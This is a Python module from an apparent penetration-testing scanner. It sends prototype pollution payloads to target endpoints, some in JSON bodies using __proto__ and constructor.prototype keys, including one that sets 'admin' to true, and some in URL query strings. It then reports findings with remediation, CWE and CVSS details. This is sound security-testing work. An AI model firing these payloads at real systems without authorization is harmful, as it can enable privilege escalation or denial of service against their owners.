"""Prototype pollution detection module."""

from __future__ import annotations

import json
from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.payload_loader import load_payloads
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule

# Server-side prototype pollution payloads
PP_JSON_PAYLOADS = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__": {"status": 510}},
    {"__proto__": {"admin": True}},
    {"constructor": {"prototype": {"admin": True}}},
]

# Client-side prototype pollution via URL parameters
PP_URL_PAYLOADS = [
    "__proto__[polluted]=true",
    "__proto__.polluted=true",
    "constructor[prototype][polluted]=true",
    "constructor.prototype.polluted=true",
    "__proto__[toString]=polluted",
    "__proto__[valueOf]=polluted",
]


class PrototypePollutionModule(BaseTestModule):
    """Detect server-side and client-side prototype pollution vulnerabilities."""

    name = "prototype_pollution"
    category = "prototype_pollution"
    owasp_categories = ["A03"]
    description = "Prototype pollution detection (server-side and client-side)"

    def get_techniques(self) -> list[str]:
        return [
            "server_side_json_pollution",
            "client_side_url_pollution",
            "gadget_detection",
        ]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = self._get_target_endpoints(session, targets)

        # Phase 1: Server-side prototype pollution via JSON
        server_findings = await self._test_server_side(http, endpoints, session)
        findings.extend(server_findings)

        # Phase 2: Client-side prototype pollution via URL parameters
        client_findings = await self._test_client_side(http, endpoints, session)
        findings.extend(client_findings)

        return findings

    async def _test_server_side(
        self, http: PencheffHTTPClient,
        endpoints: list[dict[str, Any]],
        session: PentestSession,
    ) -> list[Finding]:
        """Test for server-side prototype pollution via JSON body."""
        findings: list[Finding] = []

        json_endpoints = [
            ep for ep in endpoints
            if ep.get("method", "GET") in ("POST", "PUT", "PATCH")
        ]

        for ep in json_endpoints[:15]:
            url = ep["url"]
            method = ep.get("method", "POST")

            for payload in PP_JSON_PAYLOADS:
                try:
                    # Send the pollution payload
                    resp = await http.request(
                        method, url,
                        json_data=payload,
                        headers={"Content-Type": "application/json"},
                        module="prototype_pollution",
                    )

                    # Check for signs of pollution
                    if resp.status_code == 500:
                        findings.append(Finding(
                            title="Potential Server-Side Prototype Pollution",
                            severity=Severity.HIGH,
                            category="prototype_pollution",
                            owasp_category="A03",
                            description=(
                                f"Sending a __proto__ or constructor.prototype payload to {url} "
                                f"caused a server error. This strongly suggests the server is "
                                f"vulnerable to prototype pollution, which can lead to RCE, "
                                f"privilege escalation, or denial of service."
                            ),
                            remediation=(
                                "Sanitize JSON input to strip __proto__ and constructor keys. "
                                "Use Object.create(null) for objects used as dictionaries. "
                                "Freeze Object.prototype in Node.js applications."
                            ),
                            endpoint=url,
                            evidence=[Evidence(
                                request_method=method,
                                request_url=url,
                                request_body=json.dumps(payload),
                                response_status=resp.status_code,
                                response_body_snippet=resp.text[:300],
                                description="__proto__ payload caused server error",
                            )],
                            cwe_id="CWE-1321",
                            cvss_score=7.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
                        ))
                        break

                    # Check if the pollution persisted
                    if resp.status_code == 200:
                        try:
                            resp_json = resp.json()
                            if isinstance(resp_json, dict):
                                if resp_json.get("polluted") == "true" or resp_json.get("admin") is True:
                                    findings.append(Finding(
                                        title="Confirmed Server-Side Prototype Pollution",
                                        severity=Severity.CRITICAL,
                                        category="prototype_pollution",
                                        owasp_category="A03",
                                        description=(
                                            f"Prototype pollution confirmed at {url}. The polluted "
                                            f"property appeared in the response, proving the prototype "
                                            f"chain was modified. This can lead to RCE via gadget chains."
                                        ),
                                        remediation=(
                                            "Sanitize all JSON input. Use schema validation. "
                                            "Strip __proto__ and constructor properties before processing."
                                        ),
                                        endpoint=url,
                                        evidence=[Evidence(
                                            request_method=method,
                                            request_url=url,
                                            request_body=json.dumps(payload),
                                            response_status=resp.status_code,
                                            response_body_snippet=resp.text[:300],
                                            description="Polluted property appeared in response",
                                        )],
                                        cwe_id="CWE-1321",
                                        cvss_score=9.8,
                                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                    ))
                                    break
                        except Exception:
                            pass
                except Exception:
                    continue

        return findings

    async def _test_client_side(
        self, http: PencheffHTTPClient,
        endpoints: list[dict[str, Any]],
        session: PentestSession,
    ) -> list[Finding]:
        """Test for client-side prototype pollution via URL parameters."""
        findings: list[Finding] = []
        base_url = session.target.base_url

        for payload in PP_URL_PAYLOADS:
            test_url = f"{base_url}/?{payload}"
            try:
                resp = await http.get(test_url, module="prototype_pollution")

                # Check if the page loads JavaScript that might be affected
                if resp.status_code == 200 and "polluted" in resp.text:
                    findings.append(Finding(
                        title="Client-Side Prototype Pollution via URL",
                        severity=Severity.MEDIUM,
                        category="prototype_pollution",
                        owasp_category="A03",
                        description=(
                            f"The URL parameter '{payload}' is processed by client-side JavaScript "
                            f"and may pollute Object.prototype. Combined with DOM XSS gadgets "
                            f"(e.g., in jQuery, Lodash), this can lead to XSS."
                        ),
                        remediation=(
                            "Sanitize URL parameters before using them as object keys. "
                            "Use Object.create(null) for URL parameter parsing."
                        ),
                        endpoint=test_url,
                        parameter=payload.split("=")[0],
                        evidence=[Evidence(
                            request_method="GET",
                            request_url=test_url,
                            response_status=resp.status_code,
                            description=f"Pollution payload '{payload}' reflected in response",
                        )],
                        cwe_id="CWE-1321",
                        cvss_score=6.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                    ))
                    break
            except Exception:
                continue

        return findings
